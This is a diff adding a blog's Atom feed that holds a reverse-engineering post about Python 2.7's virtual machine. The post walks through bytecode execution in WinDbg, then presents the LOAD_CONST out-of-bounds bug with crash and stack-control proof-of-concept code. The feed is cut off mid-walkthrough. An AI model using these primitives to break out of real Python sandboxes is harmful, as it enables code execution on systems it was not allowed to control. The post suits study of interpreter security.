@@ -1,0 +1,896 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: virtual machine | Diary of a reverse-engineer]]></title>
+  <link href="http://doar-e.github.io/blog/categories/virtual-machine/atom.xml" rel="self"/>
+  <link href="http://doar-e.github.io/"/>
+  <updated>2014-04-17T23:25:32+01:00</updated>
+  <id>http://doar-e.github.io/</id>
+  <author>
+    <name><![CDATA[Axel Souchet, Jonathan Salwan, Jérémy Fetiveau]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Deep dive into Python's VM: Story of LOAD_CONST bug]]></title>
+    <link href="http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug/"/>
+    <updated>2014-04-17T23:22:00+01:00</updated>
+    <id>http://doar-e.github.io/blog/2014/04/17/deep-dive-into-pythons-vm-story-of-load_const-bug</id>
+    <content type="html"><![CDATA[<h1>Introduction</h1>
+
+<p>A year ago, I&rsquo;ve written a Python script to leverage a bug in Python&rsquo;s virtual machine: the idea was to fully control the Python virtual processor and after that to instrument the VM to execute native codes. The <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a> script wasn&rsquo;t really self-explanatory, so I believe only a few people actually took some time to understood what happened under the hood. The purpose of this post is to give you an explanation of the bug, how you can control the VM and how you can turn the bug into something that can be more useful. It&rsquo;s also a cool occasion to see how works the Python virtual machine from a low-level perspective: what we love so much right?</p>
+
+<p>But before going further, I just would like to clarify a couple of things:</p>
+
+<ul>
+<li>I haven&rsquo;t found this bug, this is quite old and <strong>known</strong> by the Python developers (trading safety for performance), so don&rsquo;t panic this is <strong>not</strong> a 0day or a new bug ; can be a cool CTF trick though</li>
+<li>Obviously, YES I know we can also &ldquo;escape&rdquo; the virtual machine with the <a href="http://docs.python.org/2/library/ctypes.html">ctypes</a> module ; but this is a feature not a bug. In addition, ctypes is always &ldquo;removed&rdquo;  from sandbox implementation in Python</li>
+</ul>
+
+
+<p>Also, keep in mind I will focus Python 2.7.5 x86 on Windows ; but obviously this is adaptable for other systems and architectures, so this is left as an exercise to the interested readers.
+All right, let&rsquo;s move on to the first part: this one will focus the essentials about the VM, and Python objects.</p>
+
+<h1>The Python virtual processor</h1>
+
+<h2>Introduction</h2>
+
+<p>As you know, Python is a (really cool) scripting language interpreted, and the source of the official interpreter is available here: <a href="http://www.python.org/ftp/python/2.7.6/Python-2.7.6.tgz">Python-2.7.6.tgz</a>. The project is written in C, and it is really readable ; so please download the sources, read them, you will learn a lot of things.
+Now all the Python code you write is being <em>compiled</em>, at some point, into some &ldquo;bytecodes&rdquo;: let&rsquo;s say it&rsquo;s exactly the same when your C codes are compiled into x86 code. But the cool thing for us, is that the Python architecture is far more simpler than x86.</p>
+
+<p>Here is a partial list of all available opcodes in Python 2.7.5:</p>
+
+<p><code>text Python275 available opcodes
+In [5]: len(opcode.opmap.keys())
+Out[5]: 119
+In [4]: opcode.opmap.keys()
+Out[4]: [
+ 'CALL_FUNCTION',
+ 'DUP_TOP',
+ 'INPLACE_FLOOR_DIVIDE',
+ 'MAP_ADD',
+ 'BINARY_XOR',
+ 'END_FINALLY',
+ 'RETURN_VALUE',
+ 'POP_BLOCK',
+ 'SETUP_LOOP',
+ 'BUILD_SET',
+ 'POP_TOP',
+ 'EXTENDED_ARG',
+ 'SETUP_FINALLY',
+ 'INPLACE_TRUE_DIVIDE',
+ 'CALL_FUNCTION_KW',
+ 'INPLACE_AND',
+ 'SETUP_EXCEPT',
+ 'STORE_NAME',
+ 'IMPORT_NAME',
+ 'LOAD_GLOBAL',
+ 'LOAD_NAME',
+ ...
+]
+</code></p>
+
+<h2>The virtual machine</h2>
+
+<p>The Python VM is fully implemented in the function <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a> that you can find in the <a href="https://github.com/python-git/python/blob/master/Python/ceval.c">ceval.c</a> file. The machine is built with a simple loop handling opcodes one-by-one with a bunch of switch-cases:</p>
+
+<p>```c Python VM
+PyObject *
+PyEval_EvalFrameEx(PyFrameObject <em>f, int throwflag)
+{
+  //&hellip;
+  fast_next_opcode:
+  //&hellip;
+  /</em> Extract opcode and argument */
+  opcode = NEXTOP();
+  oparg = 0;
+  if (HAS_ARG(opcode))</p>
+
+<pre><code>oparg = NEXTARG();
+</code></pre>
+
+<p>  //&hellip;
+  switch (opcode)
+  {</p>
+
+<pre><code>case NOP:
+  goto fast_next_opcode;
+
+case LOAD_FAST:
+  x = GETLOCAL(oparg);
+  if (x != NULL) {
+    Py_INCREF(x);
+    PUSH(x);
+    goto fast_next_opcode;
+  }
+  format_exc_check_arg(PyExc_UnboundLocalError,
+    UNBOUNDLOCAL_ERROR_MSG,
+    PyTuple_GetItem(co-&gt;co_varnames, oparg));
+  break;
+
+case LOAD_CONST:
+  x = GETITEM(consts, oparg);
+  Py_INCREF(x);
+  PUSH(x);
+  goto fast_next_opcode;
+
+case STORE_FAST:
+  v = POP();
+  SETLOCAL(oparg, v);
+  goto fast_next_opcode;
+
+//...
+</code></pre>
+
+<p>  }
+```</p>
+
+<p>The machine also uses a virtual stack to pass/return object to the different opcodes. So it really looks like an architecture we are used to deal with, nothing exotic.</p>
+
+<h2>Everything is an object</h2>
+
+<p>The first rule of the VM is that it handles only Python objects. A Python object is basically made of two parts:</p>
+
+<ul>
+<li>The first one is a header, this header is mandatory for all the objects. Defined like that:</li>
+</ul>
+
+
+<p>```c Python object header</p>
+
+<h1>define PyObject_HEAD                   \</h1>
+
+<p>  <em>PyObject_HEAD_EXTRA                \
+  Py_ssize_t ob_refcnt;               \
+  struct </em>typeobject *ob_type;</p>
+
+<h1>define PyObject_VAR_HEAD               \</h1>
+
+<p>  PyObject_HEAD                       \
+  Py_ssize_t ob_size; /<em> Number of items in variable part </em>/
+```</p>
+
+<ul>
+<li>The second one is the variable part that describes the specifics of your object. Here is for example <em>PyStringObject</em>:</li>
+</ul>
+
+
+<p>```c PyStringObject
+typedef struct {
+  PyObject_VAR_HEAD
+  long ob_shash;
+  int ob_sstate;
+  char ob_sval[1];</p>
+
+<p>  /<em> Invariants:
+   *     ob_sval contains space for &lsquo;ob_size+1&rsquo; elements.
+   *     ob_sval[ob_size] == 0.
+   *     ob_shash is the hash of the string or -1 if not computed yet.
+   *     ob_sstate != 0 iff the string object is in stringobject.c&rsquo;s
+   *       &lsquo;interned&rsquo; dictionary; in this case the two references
+   *       from &lsquo;interned&rsquo; to this object are </em>not counted<em> in ob_refcnt.
+   </em>/
+} PyStringObject;
+```</p>
+
+<p>Now, some of you may ask themselves &ldquo;How does Python know the type of an object when it receives a pointer ?&rdquo;. In fact, this is exactly the role of the field <em>ob_type</em>. Python exports a <em>_typeobject</em> static variable that describes the type of the object. Here is, for instance the <em>PyString_Type</em>:</p>
+
+<p><code>c PyString_Type
+PyTypeObject PyString_Type = {
+  PyVarObject_HEAD_INIT(&amp;PyType_Type, 0)
+  "str",
+  PyStringObject_SIZE,
+  sizeof(char),
+  string_dealloc,                             /* tp_dealloc */
+  (printfunc)string_print,                    /* tp_print */
+  0,                                          /* tp_getattr */
+  // ...
+};
+</code></p>
+
+<p>Basically, every string objects will have their <em>ob_type</em> fields pointing to that <em>PyString_Type</em> variable. With this cute little trick, Python is able to do type checking like that:</p>
+
+<p>```c PyString_Check PyString_CheckExact</p>
+
+<h1>define Py_TYPE(ob)             (((PyObject*)(ob))&ndash;>ob_type)</h1>
+
+<h1>define PyType_HasFeature(t,f)  (((t)&ndash;>tp_flags &amp; (f)) != 0)</h1>
+
+<h1>define PyType_FastSubclass(t,f)  PyType_HasFeature(t,f)</h1>
+
+<h1>define PyString_Check(op) \</h1>
+
+<p>  PyType_FastSubclass(Py_TYPE(op), Py_TPFLAGS_STRING_SUBCLASS)</p>
+
+<h1>define PyString_CheckExact(op) (Py_TYPE(op) == &amp;PyString_Type)</h1>
+
+<p>```</p>
+
+<p>With the previous tricks, and the <em>PyObject</em> type defined as follow, Python is able to handle in a generic-fashion the different objects:
+<code>c PyObject
+typedef struct _object {
+  PyObject_HEAD
+} PyObject;
+</code></p>
+
+<p>So when you are in your debugger and you want to know what type of object it is, you can use that field to identify easily the type of the object you are dealing with:</p>
+
+<p><code>text ob_type really useful when debugging
+0:000&gt; dps 026233b0 l2
+026233b0  00000001
+026233b4  1e226798 python27!PyString_Type
+</code></p>
+
+<p>Once you have done that, you can dump the variable part describing your object to extract the information you want.
+By the way, all the native objects are implemented in the <a href="https://github.com/python-git/python/tree/master/Objects">Objects/</a> directory.</p>
+
+<h3>Debugging session: stepping the VM. The hard way.</h3>
+
+<p>It&rsquo;s time for us to go a little bit deeper, at the assembly level, where we belong to ; so let&rsquo;s define a dummy function like this one:</p>
+
+<p><code>python dummy function
+def a(b, c):
+  return b + c
+</code></p>
+
+<p>Now using the Python&rsquo;s <a href="http://docs.python.org/2/library/dis.html">dis</a> module, we can disassemble the function object <em>a</em>:</p>
+
+<p>```text disassemble a
+In [20]: dis.dis(a)
+2   0 LOAD_FAST                0 (b)</p>
+
+<pre><code>3 LOAD_FAST                1 (c)
+6 BINARY_ADD
+7 RETURN_VALUE
+</code></pre>
+
+<p>In [21]: a.func_code.co_code
+In [22]: print &lsquo;&rsquo;.join(&lsquo;\x%.2x&rsquo; % ord(i) for i in a.<strong>code</strong>.co_code)
+\x7c\x00\x00\x7c\x01\x00\x17\x53</p>
+
+<p>In [23]: opcode.opname[0x7c]
+Out[23]: &lsquo;LOAD_FAST&rsquo;
+In [24]: opcode.opname[0x17]
+Out[24]: &lsquo;BINARY_ADD&rsquo;
+In [25]: opcode.opname[0x53]
+Out[25]: &lsquo;RETURN_VALUE&rsquo;
+```</p>
+
+<p>Keep in mind, as we said earlier, that everything is object ; so a function is an object, and bytecode is an object as well:</p>
+
+<p>```c PyFunctionObject PyCodeObject
+typedef struct {
+  PyObject_HEAD
+  PyObject <em>func_code;  /</em> A code object <em>/
+  // &hellip;
+} PyFunctionObject;
+/</em> Bytecode object */
+typedef struct {</p>
+
+<pre><code>PyObject_HEAD
+//...
+PyObject *co_code;    /* instruction opcodes */
+//...
+</code></pre>
+
+<p>} PyCodeObject;
+```</p>
+
+<p>Time to attach my debugger to the interpreter to see what&rsquo;s going on in that weird-machine, and to place a conditional breakpoint on <a href="https://github.com/python-git/python/blob/master/Python/ceval.c#L667">PyEval_EvalFrameEx</a>.
+Once you did that, you can call the dummy function:</p>
+
+<p>```text windbg breakpoint
+0:000> bp python27!PyEval_EvalFrameEx+0x2b2 &ldquo;.if(poi(ecx+4) == 0x53170001){}.else{g}&rdquo;
+breakpoint 0 redefined
+0:000> g
+eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
+eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b2:
+1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c</p>
+
+<p>0:000> db ecx l8
+025ea914  7c 00 00 7c 01 00 17 53                          |..|&hellip;S
+```</p>
+
+<p>OK perfect, we are in the middle of the VM, and our function is being evaluated. The register <em>ECX</em> points to the bytecode being evaluated, and the first opcode is <em>LOAD_FAST</em>.</p>
+
+<p>Basically, this opcode takes an object in the <em>fastlocals</em> array, and push it on the virtual stack. In our case, as we saw in both the disassembly and the bytecode dump, we are going to load the index 0 (the argument <em>b</em>), then the index 1 (argument <em>c</em>).</p>
+
+<p>Here&rsquo;s what it looks like in the debugger ; first step is to load the <em>LOAD_FAST</em> opcode:</p>
+
+<p><code>text fetching the LOAD_FAST opcode
+0:000&gt;
+eax=025ea914 ebx=00000000 ecx=025ea914 edx=026bef98 esi=1e222c0c edi=02002e38
+eip=1e0ec562 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b2:
+1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea914=7c
+</code></p>
+
+<p>In <em>ECX</em> we have a pointer onto the opcodes of the function being evaluated, our dummy function. <em>0x7c</em> is the value of the <em>LOAD_FAST</em> opcode as we can see:</p>
+
+<p>```c LOAD_FAST</p>
+
+<h1>define LOAD_FAST 124 /<em> Local variable number </em>/</h1>
+
+<p>```</p>
+
+<p>Then, the function needs to check if the opcode has argument or not, and that&rsquo;s done by comparing the opcode with a constant value called <em>HAVE_ARGUMENT</em>:</p>
+
+<p><code>text Checking if the opcode has an argument
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
+eip=1e0ec568 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b8:
+1e0ec568 83f85a          cmp     eax,5Ah
+</code></p>
+
+<p>Again, we can verify the value to be sure we understand what we are doing:</p>
+
+<p><code>python opcode.HAVE_ARGUMENT
+In [11]: '%x' % opcode.HAVE_ARGUMENT
+Out[11]: '5a'
+</code></p>
+
+<p>```c HAS_ARG</p>
+
+<h1>define HAS_ARG(op) ((op) >= HAVE_ARGUMENT)</h1>
+
+<p>```</p>
+
+<p>If the opcode has an argument, the function needs to retrieve it (it&rsquo;s one byte):</p>
+
+<p><code>text Fetching the argument
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=025ea915 edx=026bef98 esi=1e222c0c edi=00000000
+eip=1e0ec571 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200206
+python27!PyEval_EvalFrameEx+0x2c1:
+1e0ec571 0fb67901        movzx   edi,byte ptr [ecx+1]       ds:002b:025ea916=00
+</code></p>
+
+<p>As expected for the first <em>LOAD_FAST</em> the argument is <em>0x00</em>, perfect.
+After that the function dispatches the execution flow to the <em>LOAD_FAST</em> case defined as follow:</p>
+
+<p>```c LOAD_FAST definition</p>
+
+<h1>define GETLOCAL(i)     (fastlocals[i])</h1>
+
+<h1>define Py_INCREF(op) (                         \</h1>
+
+<pre><code>_Py_INC_REFTOTAL  _Py_REF_DEBUG_COMMA       \
+((PyObject*)(op))-&gt;ob_refcnt++)
+</code></pre>
+
+<h1>define PUSH(v)                BASIC_PUSH(v)</h1>
+
+<h1>define BASIC_PUSH(v)     (*stack_pointer++ = (v))</h1>
+
+<p>case LOAD_FAST:
+  x = GETLOCAL(oparg);
+  if (x != NULL) {</p>
+
+<pre><code>Py_INCREF(x);
+PUSH(x);
+goto fast_next_opcode;
+</code></pre>
+
+<p>  }
+  //&hellip;
+  break;
+```</p>
+
+<p>Let&rsquo;s see what it looks like in assembly:</p>
+
+<p><code>text Loads the fastlocals array (026bef98)
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=0000007b edx=00000059 esi=1e222c0c edi=00000000
+eip=1e0ec5cf esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+python27!PyEval_EvalFrameEx+0x31f:
+1e0ec5cf 8b54246c        mov     edx,dword ptr [esp+6Ch] ss:002b:0027fd44=98ef6b02
+</code></p>
+
+<p>After getting the <em>fastlocals</em>, we can retrieve an entry:</p>
+
+<p><code>text Retrieve the entry 0 of the fastlocals array
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=1e222c0c edi=00000000
+eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0d8 iopl=0         nv up ei ng nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+python27!PyEval_EvalFrameEx+0x323:
+1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d0=a0aa5e02
+</code></p>
+
+<p>Also keep in mind we called our dummy function with two strings, so let&rsquo;s actually check it is a string object:</p>
+
+<p><code>text Type checking
+0:000&gt; dps 025eaaa0 l2
+025eaaa0  00000004
+025eaaa4  1e226798 python27!PyString_Type
+</code></p>
+
+<p>Perfect, now according to the definition of <em>PyStringObject</em>:</p>
+
+<p>```c PyStringObject
+typedef struct {</p>
+
+<pre><code>PyObject_VAR_HEAD
+long ob_shash;
+int ob_sstate;
+char ob_sval[1];
+</code></pre>
+
+<p>} PyStringObject;
+```</p>
+
+<p>We should find the content of the string directly in the object:</p>
+
+<p><code>text Finding the string in the PyStringObject
+0:000&gt; db 025eaaa0 l1f
+025eaaa0  04 00 00 00 98 67 22 1e-05 00 00 00 dd 16 30 43  .....g".......0C
+025eaab0  01 00 00 00 48 65 6c 6c-6f 00 00 00 ff ff ff     ....Hello......
+</code></p>
+
+<p>Awesome, we have the size of the string at the offset <em>0x8</em>, and the actual string is at <em>0x14</em>.</p>
+
+<p>Let&rsquo;s move on to the second opcode now, this time with less details though:</p>
+
+<p><code>text Fetching the second LOAD_FAST opcode
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=025ea917 edx=026bef98 esi=025eaaa0 edi=00000000
+eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b2:
+1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea917=7c
+</code></p>
+
+<p>This time, we are loading the second argument, so the index 1 of <em>fastlocals</em>.
+We can type-check the object and dump the string stored in it:</p>
+
+<p><code>text Retrieving the index 1 of fastlocals (025ea9c0)
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=0000007b edx=026bef98 esi=025eaaa0 edi=00000001
+eip=1e0ec5d3 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei ng nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200283
+python27!PyEval_EvalFrameEx+0x323:
+1e0ec5d3 8bb4ba38010000  mov     esi,dword ptr [edx+edi*4+138h] ds:002b:026bf0d4=c0af5e02
+0:000&gt; db poi(026bf0d4) l1f
+025eafc0  04 00 00 00 98 67 22 1e-05 00 00 00 39 4a 25 29  .....g".....9J%)
+025eafd0  01 00 00 00 57 6f 72 6c-64 00 5e 02 79 00 00     ....World.^.y..
+</code></p>
+
+<p>Comes now the <em>BINARY_ADD</em> opcode:</p>
+
+<p><code>text Fetching the BINARY_ADD opcode
+0:000&gt;
+eax=0000007c ebx=00000000 ecx=025ea91a edx=026bef98 esi=025eafc0 edi=00000001
+eip=1e0ec562 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b2:
+1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91a=17
+</code></p>
+
+<p>Here it&rsquo;s supposed to retrieve the two objects on the top-of-stack, and to add them.
+The C code looks like this:</p>
+
+<p>```c BINARY_ADD</p>
+
+<h1>define SET_TOP(v)        (stack_pointer[-1] = (v))</h1>
+
+<p>case BINARY_ADD:
+  w = POP();
+  v = TOP();
+  if (PyInt_CheckExact(v) &amp;&amp; PyInt_CheckExact(w)) {</p>
+
+<pre><code>// Not our case
+</code></pre>
+
+<p>  }
+  else if (PyString_CheckExact(v) &amp;&amp;</p>
+
+<pre><code>       PyString_CheckExact(w)) {
+  x = string_concatenate(v, w, f, next_instr);
+  /* string_concatenate consumed the ref to v */
+  goto skip_decref_vx;
+</code></pre>
+
+<p>  }
+  else {</p>
+
+<pre><code>// Not our case
+</code></pre>
+
+<p>  }
+  Py_DECREF(v);
+skip_decref_vx:
+  Py_DECREF(w);
+  SET_TOP(x);
+  if (x != NULL) continue;
+  break;
+```</p>
+
+<p>And here is the assembly version where it retrieves the two objects from the top-of-stack:</p>
+
+<p><code>text POP and TOP
+0:000&gt;
+eax=00000017 ebx=00000000 ecx=00000016 edx=0000000f esi=025eafc0 edi=00000000
+eip=1e0eccf5 esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+python27!PyEval_EvalFrameEx+0xa45:
+1e0eccf5 8b75f8          mov     esi,dword ptr [ebp-8] ss:002b:026bf0d8=a0aa5e02
+...
+0:000&gt;
+eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=00000000
+eip=1e0eccfb esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+python27!PyEval_EvalFrameEx+0xa4b:
+1e0eccfb 8b7dfc          mov     edi,dword ptr [ebp-4] ss:002b:026bf0dc=c0af5e02
+0:000&gt;
+eax=1e226798 ebx=00000000 ecx=00000016 edx=0000000f esi=025eaaa0 edi=025eafc0
+eip=1e0eccfe esp=0027fcd8 ebp=026bf0e0 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200287
+python27!PyEval_EvalFrameEx+0xa4e:
+1e0eccfe 83ed04          sub     ebp,4
+</code></p>
+
+<p>A bit further we have our string concatenation:</p>
+
+<p><code>text String concatenation in string_concatenate
+0:000&gt;
+eax=025eafc0 ebx=00000000 ecx=0027fcd0 edx=026bef98 esi=025eaaa0 edi=025eafc0
+eip=1e0eb733 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+python27!PyEval_SliceIndex+0x813:
+1e0eb733 e83881fcff      call    python27!PyString_Concat (1e0b3870)
+0:000&gt; dd esp l3
+0027fcb8  0027fcd0 025eafc0 025eaaa0
+0:000&gt; p
+eax=025eaaa0 ebx=00000000 ecx=00000064 edx=000004fb esi=025eaaa0 edi=025eafc0
+eip=1e0eb738 esp=0027fcb8 ebp=00000005 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+python27!PyEval_SliceIndex+0x818:
+1e0eb738 8b442418        mov     eax,dword ptr [esp+18h] ss:002b:0027fcd0=c0aa5e02
+0:000&gt; db poi(0027fcd0) l1f
+025eaac0  01 00 00 00 98 67 22 1e-0a 00 00 00 ff ff ff ff  .....g".........
+025eaad0  00 00 00 00 48 65 6c 6c-6f 57 6f 72 6c 64 00     ....HelloWorld.
+</code></p>
+
+<p>And the last part of the case is to push the resulting string onto the virtual stack (<em>SET_TOP</em> operation):</p>
+
+<p><code>text Push the resulting object onto the virtual stack
+0:000&gt;
+eax=025eaac0 ebx=025eaac0 ecx=00000005 edx=000004fb esi=025eaaa0 edi=025eafc0
+eip=1e0ecb82 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl nz ac po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200213
+python27!PyEval_EvalFrameEx+0x8d2:
+1e0ecb82 895dfc          mov     dword ptr [ebp-4],ebx ss:002b:026bf0d8=a0aa5e02
+</code></p>
+
+<p>Last part of our deep dive, the <em>RETURN_VALUE</em> opcode:</p>
+
+<p><code>text Fetching the RETURN_VALUE opcode
+0:000&gt;
+eax=025eaac0 ebx=025eafc0 ecx=025ea91b edx=026bef98 esi=025eaac0 edi=025eafc0
+eip=1e0ec562 esp=0027fcd8 ebp=026bf0dc iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+python27!PyEval_EvalFrameEx+0x2b2:
+1e0ec562 0fb601          movzx   eax,byte ptr [ecx]         ds:002b:025ea91b=53
+</code></p>
+
+<p>All right, at least now you have a more precise idea about how that Python virtual machine works, and more importantly how you can directly debug it without symbols. Of course, you can download the debug symbols on Linux and use those information into gdb ; it should make your life easier (&hellip;.but I hate gdb man&hellip;).</p>
+
+<p>Note that I would love very much to have a debugger at the Python bytecode level, it would be really easier than instrumenting the interpreter ; if you know one ping me! If you build one ping me too :&ndash;).</p>
+
+<h1>The bug</h1>
+
+<p>Here is the bug, spot it and give it some love:</p>
+
+<p>```c LOAD_CONST bug</p>
+
+<h1>ifndef Py_DEBUG</h1>
+
+<h1>define GETITEM(v, i) PyTuple_GET_ITEM((PyTupleObject *)(v), (i))</h1>
+
+<h1>else</h1>
+
+<p>//&hellip;
+/<em> Macro, trading safety for speed &lt;&mdash; LOL, :) </em>/</p>
+
+<h1>define PyTuple_GET_ITEM(op, i) (((PyTupleObject *)(op))&ndash;>ob_item[i])</h1>
+
+<p>case LOAD_CONST:
+  x = GETITEM(consts, oparg);
+  Py_INCREF(x);
+  PUSH(x);
+  goto fast_next_opcode;
+```</p>
+
+<p>This may be a bit obscure for you, but keep in mind we control the index <em>oparg</em> and the content of <em>consts</em>. That means we can just push <em>untrusted</em> data on the virtual stack of the VM: brilliant. Getting a crash out of this bug is fairly easy, try to run these lines (on a Python 2.7 distribution):</p>
+
+<p>```python craaaaash
+import opcode
+import types</p>
+
+<p>def a():
+  pass</p>
+
+<p>a.func_code = types.CodeType(
+  0, 0, 0, 0,
+  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;]) + &lsquo;\xef\xbe&rsquo; +
+  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])   + &lsquo;\xad\xde&rsquo;,
+  (), (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
+)
+a()
+```</p>
+
+<p>..and as expected you get a fault (<em>oparg</em> is <em>edi</em>):</p>
+
+<p><code>text craaaaaaash
+(2058.2108): Access violation - code c0000005 (!!! second chance !!!)
+[...]
+eax=01cb1030 ebx=00000000 ecx=00000063 edx=00000046 esi=1e222c0c edi=beefdead
+eip=1e0ec5f7 esp=0027e7f8 ebp=0273a9f0 iopl=0         nv up ei ng nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010287
+python27!PyEval_EvalFrameEx+0x347:
+1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????
+</code></p>
+
+<p>By the way, some readers might have caught the same type of bug in <em>LOAD_FAST</em> with the <em>fastlocals</em> array ; those readers are definitely right :).</p>
+
+<h1>Walking through the PoC</h1>
+
+<p>OK, so if you look only at the faulting instruction you could say that the bug is minor and we won&rsquo;t be able to turn it into something &ldquo;useful&rdquo;. But the essential piece when you want to exploit a software is to actually completely understand how it works. Then you are more capable of turning bugs that seems useless into interesting primitives.</p>
+
+<p>As we said several times, from Python code you can&rsquo;t really push any value you want onto the Python virtual stack, obviously. The machine is only dealing with Python object, so that means with this bug we can corrupt the virtual stack by pushing arbitrary data that we control. And if you do that well, you can end up to instrument the Python VM to call whatever address you want and that&rsquo;s exactly what I did back when I wrote <a href="https://github.com/0vercl0k/stuffz/blob/master/Python's%20internals/python27_abuse_vm_to_execute_x86_code.py">python27_abuse_vm_to_execute_x86_code.py</a>.</p>
+
+<p>In Python we are really lucky because we can control a lot of thing in memory and we have natively a way to &ldquo;leak&rdquo; (I shouldn&rsquo;t call that a leak though because it&rsquo;s a feature) the address of a Python object with the function <em>id</em>. So basically we can do stuff, we can do it reliably and we can manage to not break the interpreter, like bosses.</p>
+
+<h2>Pushing attacker-controlled data on the virtual stack</h2>
+
+<p>We control <em>oparg</em> and the content of the tuple <em>consts</em>. We can also know the address of that tuple. So we can have a Python string object that stores an arbitrary value, let&rsquo;s say <em>0xdeadbeef</em> and it will be pushed on the virtual stack.</p>
+
+<p>Let&rsquo;s do that in Python now:</p>
+
+<p>```python Pushing controlled value on the virtual stack
+import opcode
+import types
+import struct</p>
+
+<p>def pshort(s):</p>
+
+<pre><code>return struct.pack('&lt;H', s)
+</code></pre>
+
+<p>def a():
+  pass</p>
+
+<p>consts = ()
+s = &lsquo;\xef\xbe\xad\xde&rsquo;
+address_s = id(s) + 20 # 20 is the offset of the array of byte we control in the string
+address_consts = id(consts)</p>
+
+<h1>python27!PyEval_EvalFrameEx+0x347:</h1>
+
+<h1>1e0ec5f7 8b74b80c        mov     esi,dword ptr [eax+edi*4+0Ch] ds:002b:fd8a8af0=????????</h1>
+
+<p>offset = ((address_s &ndash; address_consts &ndash; 0xC) / 4) &amp; 0xffffffff
+high = offset >> 16
+low =  offset &amp; 0xffff
+print &lsquo;Consts tuple @%#.8x&rsquo; % address_consts
+print &lsquo;Address of controled data @%#.8x&rsquo; % address_s
+print &lsquo;Offset between const and our object: @%#.8x&rsquo; % offset
+print &lsquo;Going to push [%#.8x] on the virtual stack&rsquo; % (address_consts + (address_s &ndash; address_consts &ndash; 0xC) + 0xc)</p>
+
+<p>a.func_code = types.CodeType(
+  0, 0, 0, 0,
+  chr(opcode.opmap[&lsquo;EXTENDED_ARG&rsquo;]) + pshort(high) +
+  chr(opcode.opmap[&lsquo;LOAD_CONST&rsquo;])   + pshort(low),
+  consts, (), (), &lsquo;&rsquo;, &lsquo;&rsquo;, 0, &lsquo;&rsquo;
+)
+a()
+```</p>
+
+<p>..annnnd..</p>
+
+<p>```text debugger view
+D:>python 1.py
